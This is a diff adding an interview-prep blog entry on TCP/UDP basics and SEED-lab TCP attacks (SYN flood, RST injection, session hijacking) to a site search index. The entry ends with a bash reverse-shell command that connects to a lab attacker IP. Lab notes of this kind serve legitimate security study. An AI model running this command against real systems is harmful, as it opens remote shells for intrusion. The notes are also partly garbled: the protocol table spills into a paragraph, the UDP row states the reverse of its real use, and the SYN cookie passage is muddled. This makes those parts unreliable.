@@ -1039,4 +1039,235 @@ and please explain your conclusion.</em></p>
         <tag>Web Security</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Transport Layer Protocols and Web Security</title>
+    <url>/2025/03/14/Transport-Layer-Protocols-and-Web-Security/</url>
+    <content><![CDATA[<blockquote>
+<p>for my X interview, basically focus on the Computer networks. I
+really recommend the Neso Academy lesson. And this note also included
+some seed labs content.</p>
+</blockquote>
+<h1 id="transport-layer">1. Transport Layer</h1>
+<p>It is responsible for process to process delivery of the entire
+message.</p>
+<p>Services provided by transport layer</p>
+<ul>
+<li>Port addressing</li>
+<li>Segmentation and Reassembly</li>
+<li>Connection Control</li>
+<li>Flow Control</li>
+<li>Error Control</li>
+</ul>
+<figure>
+<img src="attachment:dcc47129-c0e3-4086-8ba5-4c34213be94f:image.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h2 id="port-addressing">1.1 Port addressing</h2>
+<ul>
+<li>The <strong>IP address</strong> identifies a device. The
+<strong>port number(16 bit)</strong> identifies a specific process. A
+port is identifies for each transport protocol.</li>
+<li>Port numbers also in the uniform resource locators(URLs)</li>
+</ul>
+<h2 id="transport-layer-protocolstcp-and-udp">1.2 Transport Layer
+Protocols——TCP and UDP</h2>
+<h3 id="tcp-udp">1.2.1 TCP &amp;&amp; UDP</h3>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<thead>
+<tr>
+<th></th>
+<th>UDP</th>
+<th>TCP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Full name</td>
+<td>User Datagram Protocol</td>
+<td>Transmission Control Protocol</td>
+</tr>
+<tr>
+<td>Used by</td>
+<td>Used by applications that cannot tolerate small loss of data and can
+tolerate delay:</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain Name System(DNS)</strong> <strong>Dynamic Host
+Configuration Protocol(DHCP)</strong> Online games | Used by applicants
+that can tolerate delay but cannot tolerate loss: HTTP FTP Telnet SMTP |
+| Error control | NO | Yes | | Flow control | NO | Yes | | Connection
+Control | Connectionless and unreliable | Connection and reliable | |
+Header fields | simple | complicated |</p>
+<h3 id="phases-of-tcp-transmission">1.2.2 <strong>3 Phases of TCP
+Transmission</strong></h3>
+<p><strong>TCP Connection establishment:</strong> Three-Way
+Handshaking</p>
+<ul>
+<li><strong>SYN</strong> → Client sends a <strong>SYN (synchronize)
+packet</strong> to the server, requesting a connection.</li>
+<li><strong>SYN-ACK</strong> → Server responds with
+<strong>SYN-ACK</strong>, acknowledging the request.</li>
+<li><strong>ACK</strong> → Client replies with <strong>ACK</strong>,
+confirming the connection.</li>
+</ul>
+<p><strong>Data Transfer:</strong> TCP ensures <strong>reliable and
+ordered</strong> data transmission</p>
+<ul>
+<li>flow control: TCP uses a sliding window to handle flow control.
+Between Go-Back-N protocol and Selective repeat. And the sliding window
+size is dynamic.</li>
+<li>Congestion control: The sender have the congestion window determined
+by the receiver but also by the congestion in the network. The size is
+dynamic. Not only the congestion window but also have congestion policy.
+The congestion policy based on 3 phases. The slow start(starts with a
+very slow rate of transmission); congestion avoidance(after reached the
+threshold); The congestion detection(return to other phase)</li>
+</ul>
+<p><strong>Connection Termination:</strong> Four-Way Handshaking</p>
+<ul>
+<li><strong>FIN</strong> → Client sends a <strong>FIN (finish)</strong>
+request to end communication.</li>
+<li><strong>ACK</strong> → Server acknowledges the request.</li>
+<li><strong>FIN</strong> → Server also sends a <strong>FIN</strong>,
+indicating it’s ready to close.</li>
+<li><strong>ACK</strong> → Client sends a final <strong>ACK</strong>,
+confirming the termination.</li>
+</ul>
+<h1 id="attacks-on-tcpip-protocols">2. Attacks on TCP/IP Protocols</h1>
+<blockquote>
+<p>In the computer networks security class, we use <code>netwox</code>
+tool to implement ARP cache poisoning attack, ICMP redirect attack</p>
+</blockquote>
+<h2 id="syn-flooding-attack">2.1 SYN Flooding Attack</h2>
+<p>SYN flood is a form of DoS attack in which attackers send many SYN
+requests to a victim’s TCP port, but the attackers have no intention to
+finish the 3-way handshake procedure. In the TCP establish phase.
+Attackers either use spoofed IP address or do not continue the
+procedure. Through this attack, attackers can flood the victim’s queue
+that is used for half-opened connections, i.e. the connections that has
+finished SYN, SYN-ACK, but has not yet gotten a final ACK back. When
+this queue is full, the victim cannot take any more connection. Figure 2
+illustrates the attack.</p>
+<figure>
+<img src="attachment:4c608475-64f1-440e-8530-c0978b1c7db5:image.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>close the <strong>SYN Cookie Countermeasure.</strong> The server will
+discards the SYN entry. If the server later receives an ACK response
+from the client, it can use the cookie to reconstruct the SYN queue
+entry.</p>
+<h2 id="tcp-rst-attacks-on-telnet-connectionsssh">2.2 TCP RST Attacks on
+telnet Connections/ssh</h2>
+<p>The TCP RST Attack can terminate an established TCP connection
+between two victims. For example, if there is an established telnet
+connection (TCP) between two users A and B, attackers can spoof a RST
+packet from A to B, breaking this existing connection. To succeed in
+this attack, attackers need to correctly construct the TCP RST
+packet.</p>
+<aside>
+<p>💡</p>
+<p>Launching the attack manually. Please use Scapy to conduct the TCP
+RST attack. A skeleton code is provided in the following.</p>
+</aside>
+<aside>
+<p>💡</p>
+<p>Launching the attack by <code>netwox</code>.</p>
+</aside>
+<p>you can also use this kind of attack to break the TCP connection
+between a host and the video streaming applicants.</p>
+<h2 id="tcp-session-hijacking">2.3 TCP Session Hijacking</h2>
+<p>The objective of the TCP Session Hijacking attack is to hijack an
+existing TCP connection (session) between two victims by injecting
+malicious contents into this session. If this connection is a telnet
+session, attackers can inject malicious commands (e.g. deleting an
+important file) into this session, causing the victims to execute the
+malicious commands. Figure 3 depicts how the attack works. In this task,
+you need to demonstrate how you can hijack a telnet session between two
+computers. Your goal is to get the telnet server to run a malicious
+command from you. For the simplicity of the task, we assume that the
+attacker and the victim are on the same LAN.</p>
+<aside>
+<p>💡</p>
+<p>Launching the attack manually. Please use Scapy to conduct the TCP
+Session Hijacking attack. A skeleton code is provided in the
+following.</p>
+</aside>
+<aside>
+<p>💡</p>
+<p>Launching the attack by <code>netwox</code>.</p>
+</aside>
+<figure>
+<img src="attachment:57a2e589-e8f1-4cfc-9fb1-148f012a8a8b:image.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<ul>
+<li><strong>Sniffing the Network Traffic</strong>: The attacker listens
+to the communication between A and B, capturing the ongoing TCP session,
+including the <strong>IP addresses</strong>, <strong>TCP sequence
+numbers</strong>, and <strong>ACK numbers</strong>.</li>
+<li><strong>Sending Spoofed Packets</strong>: The attacker
+<strong>forges a TCP packet</strong> that appears to come from B (by
+using B’s IP address and the correct sequence numbers). The packet will
+be crafted to look like a legitimate response to A.</li>
+</ul>
+<h2 id="creating-reverse-shell-using-tcp-session-hijacking">2.4 Creating
+Reverse Shell using TCP Session Hijacking</h2>
+<p>When attackers are able to inject a command to the victim’s machine
+using TCP session hijacking, they are not interested in running one
+simple command on the victim machine, they are interested in running
+many commands. Obviously, running all these commands all through TCP
+session hijacking is inconvenient. What attackers want to achieve is to
+use the attack to set up a back door, so they can use this back door to
+conveniently conduct further damages.</p>
+<p>A typical way to set up back doors is to run a reverse shell from the
+victim machine. Reverse shell is a shell process running on a remote
+machine, connecting back to the attacker’s machine. This gives an
+attacker a convenient way to access a remote machine once it has been
+compromised.</p>
+<p>In the following, we will show how we can set up a reverse shell if
+we can directly run a command on the victim machine. In the TCP session
+hijacking attack, attackers cannot directly run a command on the victim
+machine, so their jobs is to run a reverse-shell command through the
+session hijacking attack.</p>
+<aside>
+<p>💡</p>
+<p>In the summary</p>
+<ul>
+<li><strong>TCP session hijacking</strong> is used to <strong>inject
+malicious commands</strong> into an existing session.</li>
+<li>The ultimate goal is to <strong>establish a reverse shell</strong>
+that provides <strong>remote access</strong> to the compromised system.
+Once the reverse shell is set up, the attacker can use it to execute
+further commands and achieve long-term control over the victim
+machine.</li>
+</ul>
+</aside>
+<figure>
+<img src="attachment:3a5c5e39-be6a-4249-89d8-a8da1e3d4d59:image.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>In summery,
+<code>"/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1”</code>
+(and this is a <strong>Reverse Shell Command)</strong> starts a bash
+shell, with its input coming from a tcp connection, and its standard and
+error outputs being redirected to the same tcp connection.</p>
+]]></content>
+      <categories>
+        <category>Interview preparation</category>
+      </categories>
+      <tags>
+        <tag>Web Security</tag>
+      </tags>
+  </entry>
 </search>
